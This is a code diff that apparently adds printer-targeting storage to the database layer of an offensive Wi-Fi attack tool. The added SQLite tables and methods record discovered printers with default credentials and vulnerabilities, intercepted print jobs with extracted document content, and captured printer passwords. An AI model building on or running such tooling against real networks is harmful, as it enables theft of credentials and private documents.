@@ -52,6 +52,50 @@ class POSDatabase:
         self.cursor.execute('CREATE INDEX IF NOT EXISTS idx_deauth_bssid ON deauth_events(bssid)')
         self.cursor.execute('CREATE INDEX IF NOT EXISTS idx_eapol_bssid ON eapol_frames(bssid)')
         self.conn.commit()
+        self._setup_printer_tables()
+
+    def _setup_printer_tables(self):
+        """Create printer-related tables."""
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS printers (
+                ip TEXT PRIMARY KEY,
+                model TEXT,
+                manufacturer TEXT,
+                hostname TEXT,
+                serial TEXT,
+                firmware_version TEXT,
+                discovery_time REAL,
+                ssid TEXT,
+                associated_bssid TEXT,
+                default_creds INTEGER DEFAULT 0,
+                vulnerabilities TEXT
+            )
+        ''')
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS print_jobs (
+                job_id INTEGER PRIMARY KEY AUTOINCREMENT,
+                printer_ip TEXT,
+                timestamp REAL,
+                source_ip TEXT,
+                document_name TEXT,
+                document_type TEXT,
+                page_count INTEGER,
+                file_size INTEGER,
+                extracted_content BLOB
+            )
+        ''')
+        self.cursor.execute('''
+            CREATE TABLE IF NOT EXISTS printer_credentials (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                printer_ip TEXT,
+                username TEXT,
+                password TEXT,
+                auth_method TEXT,
+                found_via TEXT,
+                timestamp REAL
+            )
+        ''')
+        self.conn.commit()
 
     def _maybe_commit(self):
         now = time.monotonic()
@@ -125,6 +169,68 @@ class POSDatabase:
         self.conn.commit()
         log.critical(f"CREDENTIAL CAPTURED: user='{username}' from {client_ip}")
         log.debug(f"  Password: {'*' * len(password)}")
+
+    # ─── Printer helper methods ─────────────────────────────────────────────────
+
+    def log_printer(self, ip, model, manufacturer, hostname, serial, firmware, ssid, bssid, default_creds, vulns):
+        """Insert or update a discovered printer."""
+        self.cursor.execute('''
+            INSERT INTO printers
+                (ip, model, manufacturer, hostname, serial, firmware_version,
+                 discovery_time, ssid, associated_bssid, default_creds, vulnerabilities)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ON CONFLICT(ip) DO UPDATE SET
+                model = COALESCE(excluded.model, printers.model),
+                manufacturer = COALESCE(excluded.manufacturer, printers.manufacturer),
+                hostname = COALESCE(excluded.hostname, printers.hostname),
+                serial = COALESCE(excluded.serial, printers.serial),
+                firmware_version = COALESCE(excluded.firmware_version, printers.firmware_version),
+                ssid = COALESCE(excluded.ssid, printers.ssid),
+                associated_bssid = COALESCE(excluded.associated_bssid, printers.associated_bssid),
+                default_creds = excluded.default_creds,
+                vulnerabilities = COALESCE(excluded.vulnerabilities, printers.vulnerabilities)
+        ''', (ip, model, manufacturer, hostname, serial, firmware,
+              time.time(), ssid, bssid, 1 if default_creds else 0, vulns))
+        self._maybe_commit()
+
+    def log_print_job(self, printer_ip, source_ip, doc_name, doc_type, page_count, file_size, content):
+        """Log an intercepted print job."""
+        self.cursor.execute('''
+            INSERT INTO print_jobs
+                (printer_ip, timestamp, source_ip, document_name, document_type,
+                 page_count, file_size, extracted_content)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (printer_ip, time.time(), source_ip, doc_name, doc_type,
+              page_count, file_size, content))
+        self._maybe_commit()
+        log.info(f"Print job logged: {doc_type} from {source_ip} to {printer_ip}")
+
+    def log_printer_credential(self, printer_ip, username, password, auth_method, found_via):
+        """Log a captured printer credential."""
+        self.cursor.execute('''
+            INSERT INTO printer_credentials
+                (printer_ip, username, password, auth_method, found_via, timestamp)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (printer_ip, username, password, auth_method, found_via, time.time()))
+        self.conn.commit()
+        log.critical(f"PRINTER CRED CAPTURED: {auth_method} {username}@{printer_ip}")
+
+    def get_printers(self):
+        """Return all discovered printers."""
+        self.cursor.execute('SELECT * FROM printers ORDER BY discovery_time DESC')
+        columns = [desc[0] for desc in self.cursor.description]
+        return [dict(zip(columns, row)) for row in self.cursor.fetchall()]
+
+    def get_print_jobs(self, printer_ip=None):
+        """Return intercepted print jobs, optionally filtered by printer IP."""
+        if printer_ip:
+            self.cursor.execute(
+                'SELECT * FROM print_jobs WHERE printer_ip = ? ORDER BY timestamp DESC',
+                (printer_ip,))
+        else:
+            self.cursor.execute('SELECT * FROM print_jobs ORDER BY timestamp DESC')
+        columns = [desc[0] for desc in self.cursor.description]
+        return [dict(zip(columns, row)) for row in self.cursor.fetchall()]
 
     # ─── Query methods (used by orchestrator for auto-targeting) ──────────────
 
